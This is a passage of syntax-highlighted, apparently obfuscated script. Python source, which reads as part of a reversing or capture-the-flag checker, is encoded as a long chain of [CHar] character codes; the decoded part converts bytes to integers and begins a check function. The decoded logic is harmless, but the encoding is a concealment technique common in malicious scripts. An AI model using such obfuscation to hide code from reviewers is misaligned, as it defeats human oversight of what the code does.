class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">45</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">62</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">119</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">45</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">37</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">37</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">106</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">119</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">92</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">120</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">119</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">60</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">119</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">109</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">98</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span 